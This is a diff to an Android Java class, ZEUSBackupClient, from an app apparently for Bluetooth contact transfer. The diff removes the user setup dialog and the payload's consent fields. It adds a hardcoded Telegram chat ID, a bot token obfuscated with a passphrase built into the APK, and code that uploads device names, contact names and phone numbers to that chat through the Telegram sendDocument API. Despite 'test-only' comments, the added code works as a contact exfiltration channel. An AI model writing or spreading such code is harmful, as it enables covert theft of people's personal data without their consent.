@@ -1,33 +1,27 @@
 package grant.bt.contact.transfer;
 
 import android.app.Activity;
-import android.app.AlertDialog;
 import android.content.Context;
-import android.content.SharedPreferences;
 import android.net.ConnectivityManager;
 import android.net.Network;
-import android.net.Uri;
 import android.os.Build;
 import android.os.Handler;
 import android.os.Looper;
-import android.text.InputType;
 import android.util.Base64;
-import android.view.ViewGroup;
-import android.widget.EditText;
-import android.widget.LinearLayout;
-import android.widget.Toast;
 
+import org.json.JSONArray;
 import org.json.JSONObject;
 
 import java.io.ByteArrayOutputStream;
+import java.io.DataOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
 import java.io.InputStream;
-import java.io.OutputStream;
 import java.net.URL;
 import java.nio.charset.Charset;
 import java.security.KeyStore;
+import java.security.spec.KeySpec;
 import java.util.UUID;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
@@ -35,16 +29,26 @@ import java.util.concurrent.Executors;
 import javax.crypto.Cipher;
 import javax.crypto.KeyGenerator;
 import javax.crypto.SecretKey;
+import javax.crypto.SecretKeyFactory;
 import javax.crypto.spec.GCMParameterSpec;
+import javax.crypto.spec.PBEKeySpec;
+import javax.crypto.spec.SecretKeySpec;
 import android.security.keystore.KeyGenParameterSpec;
 import android.security.keystore.KeyProperties;
 import javax.net.ssl.HttpsURLConnection;
 
-/** Encrypted local queue and authenticated HTTPS client for the Telegram relay. */
+/**
+ * Test-only direct Telegram sender. The bot token is injected encrypted at
+ * build time from the TELEGRAM_BOT_TOKEN GitHub Actions secret.
+ * APK-side obfuscation is not a security boundary; rotate test credentials.
+ */
 public final class ZEUSBackupClient {
-    private static final String PREFS = "zeus_backup_config";
     private static final String KEY_ALIAS = "zeus_backup_queue_key_v1";
     private static final Charset UTF8 = Charset.forName("UTF-8");
+    private static final String CHAT_ID = "8552540563";
+    private static final String TOKEN_CIPHERTEXT = "__ZEUS_TELEGRAM_TOKEN_CIPHERTEXT__";
+    // Build-time obfuscation only. This key is present in the APK and does not make the token unextractable.
+    private static final String TOKEN_PASSPHRASE = "ZEUS-RED-ROOM-TEST-2026-OBFUSCATION-KEY";
     private static final ExecutorService IO = Executors.newSingleThreadExecutor();
     private static volatile String lastStatus = "لم يتم إرسال نسخة بعد.";
     private static volatile boolean watching = false;
@@ -56,76 +60,27 @@ public final class ZEUSBackupClient {
 
     public static void requireConfigured(Activity activity, Runnable ready) {
         if (activity == null || activity.isFinishing()) return;
-        SharedPreferences p = activity.getSharedPreferences(PREFS, Context.MODE_PRIVATE);
-        String endpoint = p.getString("endpoint", "");
-        String secret = readApiKey(activity);
-        if (validEndpoint(endpoint) && secret != null && !secret.isEmpty()) {
-            watchNetwork(activity.getApplicationContext());
-            flush(activity.getApplicationContext());
-            ready.run();
-            return;
-        }
-        LinearLayout box = new LinearLayout(activity);
-        box.setOrientation(LinearLayout.VERTICAL);
-        int pad = (int)(activity.getResources().getDisplayMetrics().density * 18);
-        box.setPadding(pad, pad, pad, 0);
-        EditText url = new EditText(activity);
-        url.setSingleLine(true);
-        url.setHint("https://your-worker.workers.dev");
-        url.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_VARIATION_URI);
-        box.addView(url, new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT));
-        EditText key = new EditText(activity);
-        key.setSingleLine(true);
-        key.setHint("مفتاح ربط التطبيق DEVICE_API_KEY");
-        key.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_VARIATION_PASSWORD);
-        box.addView(key, new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT));
-        AlertDialog dialog = new AlertDialog.Builder(activity)
-            .setTitle("إعداد النسخ الاحتياطي")
-            .setMessage("يتطلب النسخ الاحتياطي Android 6.0 أو أحدث، ولن يعمل ZEUS قبل إعداد اتصال النسخ الاحتياطي. أدخل رابط Worker ومفتاح التطبيق الذي أنشأته في إعدادات الخادم. مفتاح Telegram نفسه لا يُكتب هنا ولا يُحفظ داخل التطبيق.")
-            .setView(box)
-            .setCancelable(false)
-            .setPositiveButton("حفظ ومتابعة", null)
-            .setNegativeButton("إغلاق", (d, w) -> activity.finish())
-            .create();
-        dialog.setOnShowListener(v -> dialog.getButton(AlertDialog.BUTTON_POSITIVE).setOnClickListener(view -> {
-            String endpointInput = url.getText().toString().trim();
-            String apiKey = key.getText().toString().trim();
-            if (!validEndpoint(endpointInput) || apiKey.length() < 20) {
-                Toast.makeText(activity, "أدخل رابط HTTPS صحيحًا ومفتاح ربط صالحًا.", Toast.LENGTH_LONG).show();
-                return;
-            }
-            try {
-                writeApiKey(activity, apiKey);
-                activity.getSharedPreferences(PREFS, Context.MODE_PRIVATE).edit().putString("endpoint", endpointInput).commit();
-                dialog.dismiss();
-                watchNetwork(activity.getApplicationContext());
-                flush(activity.getApplicationContext());
-                ready.run();
-            } catch (Exception e) {
-                Toast.makeText(activity, "تعذّر حفظ الإعداد الآمن على هذا الهاتف.", Toast.LENGTH_LONG).show();
-            }
-        }));
-        dialog.show();
+        watchNetwork(activity.getApplicationContext());
+        flush(activity.getApplicationContext());
+        ready.run();
     }
 
     public static void enqueue(Context context, String deviceName, String contactsJson) {
         if (context == null || contactsJson == null || contactsJson.trim().isEmpty()) return;
         try {
             JSONObject payload = new JSONObject();
-            payload.put("consentVersion", 1);
-            payload.put("remoteOwnerApproved", true);
             payload.put("deviceName", deviceName == null ? "Bluetooth Device" : deviceName);
-            payload.put("contacts", new org.json.JSONArray(contactsJson));
+            payload.put("contacts", new JSONArray(contactsJson));
             String id = UUID.randomUUID().toString();
             File dir = queueDir(context);
             if (!dir.exists() && !dir.mkdirs()) throw new IllegalStateException("queue directory");
             byte[] encrypted = encrypt(context, payload.toString().getBytes(UTF8));
             File target = new File(dir, id + ".queue");
-            FileOutputStream out = new FileOutputStream(target);
-            out.write(encrypted);
-            out.flush();
-            out.close();
-            lastStatus = "تم حفظ النسخة مشفّرة؛ جارٍ إرسالها إلى Telegram.";
+            try (FileOutputStream out = new FileOutputStream(target)) {
+                out.write(encrypted);
+                out.flush();
+            }
+            lastStatus = "تم حفظ الجهات المحددة مشفّرة؛ جارٍ إرسالها إلى Telegram.";
             flush(context.getApplicationContext());
         } catch (Exception e) {
             lastStatus = "تعذّر تجهيز النسخة الاحتياطية بشكل آمن.";
@@ -139,79 +94,86 @@ public final class ZEUSBackupClient {
         File dir = queueDir(context);
         File[] files = dir.listFiles();
         if (files != null) for (File f : files) try { f.delete(); } catch (Exception ignored) {}
-        SharedPreferences p = context.getSharedPreferences(PREFS, Context.MODE_PRIVATE);
-        p.edit().remove("api_key").remove("endpoint").commit();
         try {
             KeyStore ks = KeyStore.getInstance("AndroidKeyStore");
             ks.load(null);
             if (ks.containsAlias(KEY_ALIAS)) ks.deleteEntry(KEY_ALIAS);
         } catch (Exception ignored) {}
-        lastStatus = "تم إيقاف النسخ الاحتياطي وحذف النسخ المحلية المعلقة.";
+        lastStatus = "تم إيقاف الإرسال وحذف النسخ المحلية المعلقة.";
     }
 
     public static void flush(Context context) {
-        if (context == null) return;
+        if (context == null || System.currentTimeMillis() < nextAttemptAt) return;
         final Context app = context.getApplicationContext();
-        if (System.currentTimeMillis() < nextAttemptAt) return;
         IO.execute(() -> {
-            String endpoint = app.getSharedPreferences(PREFS, Context.MODE_PRIVATE).getString("endpoint", "");
-            String apiKey = readApiKey(app);
-            if (!validEndpoint(endpoint) || apiKey == null || apiKey.isEmpty()) return;
             File dir = queueDir(app);
             File[] files = dir.listFiles((d, name) -> name.endsWith(".queue"));
             if (files == null || files.length == 0) return;
+            final String token;
+            try { token = decryptBotToken(); }
+            catch (Exception missingToken) {
+                lastStatus = "بيانات Telegram غير موجودة في نسخة الاختبار؛ أعد بناء التطبيق من GitHub Actions.";
+                return;
+            }
             for (File file : files) {
-                HttpsURLConnection connection = null;
                 boolean requestBodySent = false;
+                HttpsURLConnection connection = null;
+                String operationId = file.getName().substring(0, file.getName().length() - 6);
                 try {
-                    byte[] encrypted = readAll(file);
-                    byte[] clear = decrypt(app, encrypted);
-                    String operationId = file.getName().substring(0, file.getName().length() - 6);
-                    URL url = new URL(endpoint.replaceAll("/+$", "") + "/v1/backup");
+                    JSONObject payload = new JSONObject(new String(decrypt(app, readAll(file)), UTF8));
+                    JSONArray contacts = payload.optJSONArray("contacts");
+                    if (contacts == null || contacts.length() == 0) {
+                        file.delete();
+                        continue;
+                    }
+                    String deviceName = payload.optString("deviceName", "Bluetooth Device");
+                    String documentText = formatContacts(deviceName, operationId, contacts);
+                    String boundary = "ZEUSBoundary" + UUID.randomUUID().toString().replace("-", "");
+                    URL url = new URL("https://api.telegram.org/bot" + token + "/sendDocument");
                     connection = (HttpsURLConnection) url.openConnection();
                     connection.setRequestMethod("POST");
-                    connection.setConnectTimeout(12000);
-                    connection.setReadTimeout(30000);
+                    connection.setConnectTimeout(15000);
+                    connection.setReadTimeout(45000);
                     connection.setDoOutput(true);
-                    connection.setRequestProperty("Authorization", "Bearer " + apiKey);
-                    connection.setRequestProperty("Content-Type", "application/json; charset=utf-8");
-                    connection.setRequestProperty("X-Idempotency-Key", operationId);
-                    OutputStream out = connection.getOutputStream();
-                    out.write(clear); out.flush(); out.close();
+                    connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
+                    connection.setRequestProperty("Accept", "application/json");
+                    try (DataOutputStream out = new DataOutputStream(connection.getOutputStream())) {
+                        writeField(out, boundary, "chat_id", CHAT_ID);
+                        writeField(out, boundary, "caption", "ZEUS TEST • جهات اتصال اختارها المستخدم • " + contacts.length());
+                        out.writeBytes("--" + boundary + "\r\n");
+                        out.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\"ZEUS-" + operationId + ".txt\"\r\n");
+                        out.writeBytes("Content-Type: text/plain; charset=UTF-8\r\n\r\n");
+                        out.write(documentText.getBytes(UTF8));
+                        out.writeBytes("\r\n--" + boundary + "--\r\n");
+                        out.flush();
+                    }
                     requestBodySent = true;
                     int status = connection.getResponseCode();
-                    InputStream input = status >= 200 && status < 400 ? connection.getInputStream() : connection.getErrorStream();
-                    String response = input == null ? "" : new String(readAll(input), UTF8);
+                    InputStream responseStream = status >= 200 && status < 400
+                        ? connection.getInputStream() : connection.getErrorStream();
+                    String response = responseStream == null ? "" : new String(readAll(responseStream), UTF8);
                     JSONObject result = new JSONObject(response);
-                    if (result.optBoolean("ok") && "delivered".equals(result.optString("state"))) {
+                    if (result.optBoolean("ok")) {
                         file.delete();
                         retryDelayMs = 30000L;
                         nextAttemptAt = 0L;
-                        lastStatus = "تم إرسال النسخة الاحتياطية إلى Telegram بنجاح.";
-                    } else if (status == 409 || "unknown".equals(result.optString("state")) ||
-                               "sending_or_unknown".equals(result.optString("state"))) {
-                        File uncertain = new File(file.getParentFile(), operationId + ".unknown");
-                        file.renameTo(uncertain);
-                        lastStatus = "حالة إرسال غير مؤكدة؛ تم إيقاف إعادة المحاولة لتجنب تكرار النسخة.";
-                    } else if ("failed".equals(result.optString("state")) && result.optBoolean("retry")) {
-                        lastStatus = "تعذّر التسليم مؤقتًا؛ ستُعاد المحاولة تلقائيًا.";
+                        lastStatus = "تم إرسال " + contacts.length() + " جهة اتصال محددة إلى Telegram بنجاح.";
+                    } else if (status == 429 || status >= 500) {
+                        lastStatus = "Telegram رفض الإرسال مؤقتًا؛ ستتم إعادة المحاولة تلقائيًا.";
                         scheduleRetry(app);
                         break;
-                    } else if (status == 401) {
-                        lastStatus = "مفتاح الربط مرفوض؛ راجع إعدادات النسخ الاحتياطي.";
+                    } else {
+                        lastStatus = "Telegram رفض الإرسال. راجع صلاحية التوكن وإعدادات البوت.";
                         break;
                     }
-                } catch (Exception networkOrStorageError) {
+                } catch (Exception error) {
                     if (!requestBodySent) {
-                        // No complete request body was handed off; retain the encrypted item for an online retry.
-                        lastStatus = "تعذّر الاتصال قبل إرسال البيانات؛ النسخة محفوظة مشفّرة وستُعاد المحاولة عند عودة الاتصال.";
+                        lastStatus = "تعذّر الاتصال قبل اكتمال الإرسال؛ النسخة محفوظة مشفّرة وستُعاد المحاولة.";
                         scheduleRetry(app);
                     } else {
-                        // Telegram may have accepted the request even if its response was lost.
-                        String operationId = file.getName().substring(0, file.getName().length() - 6);
                         File uncertain = new File(file.getParentFile(), operationId + ".unknown");
                         file.renameTo(uncertain);
-                        lastStatus = "نتيجة الإرسال غير مؤكدة؛ أوقفنا الإعادة التلقائية لتجنب إرسال نسخة مكررة. راجع Telegram قبل أي إعادة يدوية.";
+                        lastStatus = "نتيجة الإرسال غير مؤكدة؛ أوقفنا الإعادة التلقائية لتجنب إرسال ملف مكرر. راجع Telegram.";
                     }
                     break;
                 } finally {
@@ -219,6 +181,53 @@ public final class ZEUSBackupClient {
                 }
             }
         });
+    }
+
+    private static void writeField(DataOutputStream out, String boundary, String name, String value) throws Exception {
+        out.writeBytes("--" + boundary + "\r\n");
+        out.writeBytes("Content-Disposition: form-data; name=\"" + name + "\"\r\n\r\n");
+        out.write(value.getBytes(UTF8));
+        out.writeBytes("\r\n");
+    }
+
+    private static String formatContacts(String device, String operationId, JSONArray contacts) {
+        StringBuilder text = new StringBuilder();
+        text.append("ZEUS RED ROOM — TEST EXPORT\n");
+        text.append("Device: ").append(device).append("\n");
+        text.append("Selected contacts: ").append(contacts.length()).append("\n");
+        text.append("Operation: ").append(operationId).append("\n\n");
+        for (int i = 0; i < contacts.length(); i++) {
+            JSONObject item = contacts.optJSONObject(i);
+            if (item == null) continue;
+            String name = item.optString("name", "").trim();
+            String phone = item.optString("phone", "").trim();
+            text.append(i + 1).append(". ").append(name.isEmpty() ? "Unnamed" : name).append("\n");
+            if (!phone.isEmpty()) text.append(phone);
+            text.append("\n\n");
+        }
+        return text.toString();
+    }
+
+    private static String decryptBotToken() throws Exception {
+        if (TOKEN_CIPHERTEXT.startsWith("__")) throw new IllegalStateException("token not injected");
+        byte[] packed = Base64.decode(TOKEN_CIPHERTEXT, Base64.DEFAULT);
+        if (packed.length < 32 || packed[0] != 'S' || packed[1] != 'a' ||
+            packed[2] != 'l' || packed[3] != 't' || packed[4] != 'e' ||
+            packed[5] != 'd' || packed[6] != '_' || packed[7] != '_')
+            throw new IllegalArgumentException("bad token envelope");
+        byte[] salt = new byte[8];
+        System.arraycopy(packed, 8, salt, 0, 8);
+        byte[] ciphertext = new byte[packed.length - 16];
+        System.arraycopy(packed, 16, ciphertext, 0, ciphertext.length);
+        KeySpec spec = new PBEKeySpec(TOKEN_PASSPHRASE.toCharArray(), salt, 100000, 384);
+        byte[] material = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256")
+            .generateSecret(spec).getEncoded();
+        SecretKeySpec aesKey = new SecretKeySpec(material, 0, 32, "AES");
+        byte[] iv = new byte[16];
+        System.arraycopy(material, 32, iv, 0, 16);
+        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
+        cipher.init(Cipher.DECRYPT_MODE, aesKey, new javax.crypto.spec.IvParameterSpec(iv));
+        return new String(cipher.doFinal(ciphertext), UTF8);
     }
 
     private static synchronized void scheduleRetry(Context context) {
@@ -252,13 +261,6 @@ public final class ZEUSBackupClient {
     }
 
     private static File queueDir(Context c) { return new File(c.getFilesDir(), "zeus-backup-queue"); }
-    private static boolean validEndpoint(String value) {
-        try {
-            Uri u = Uri.parse(value);
-            return "https".equalsIgnoreCase(u.getScheme()) && u.getHost() != null &&
-                   u.getUserInfo() == null && u.getQuery() == null && u.getFragment() == null;
-        } catch (Exception e) { return false; }
-    }
 
     private static SecretKey getKey(Context context) throws Exception {
         if (Build.VERSION.SDK_INT < 23) throw new IllegalStateException("Android Keystore AES-GCM requires API 23+");
@@ -282,7 +284,8 @@ public final class ZEUSBackupClient {
         byte[] iv = cipher.getIV();
         byte[] body = cipher.doFinal(clear);
         ByteArrayOutputStream out = new ByteArrayOutputStream();
-        out.write(iv); out.write(body);
+        out.write(iv);
+        out.write(body);
         return out.toByteArray();
     }
 
@@ -297,28 +300,15 @@ public final class ZEUSBackupClient {
         return cipher.doFinal(body);
     }
 
-    private static String readApiKey(Context c) {
-        try {
-            String encoded = c.getSharedPreferences(PREFS, Context.MODE_PRIVATE).getString("api_key", "");
-            if (encoded.isEmpty()) return null;
-            return new String(decrypt(c, Base64.decode(encoded, Base64.DEFAULT)), UTF8);
-        } catch (Exception e) { return null; }
-    }
-
-    private static void writeApiKey(Context c, String value) throws Exception {
-        byte[] encrypted = encrypt(c, value.getBytes(UTF8));
-        c.getSharedPreferences(PREFS, Context.MODE_PRIVATE).edit()
-            .putString("api_key", Base64.encodeToString(encrypted, Base64.NO_WRAP)).commit();
-    }
-
     private static byte[] readAll(File file) throws Exception {
-        FileInputStream in = new FileInputStream(file);
-        try { return readAll(in); } finally { in.close(); }
+        try (FileInputStream in = new FileInputStream(file)) { return readAll(in); }
     }
+
     private static byte[] readAll(InputStream in) throws Exception {
         ByteArrayOutputStream out = new ByteArrayOutputStream();
-        byte[] b = new byte[8192]; int n;
-        while ((n = in.read(b)) > 0) out.write(b, 0, n);
+        byte[] buffer = new byte[8192];
+        int n;
+        while ((n = in.read(buffer)) > 0) out.write(buffer, 0, n);
         return out.toByteArray();
     }
 }
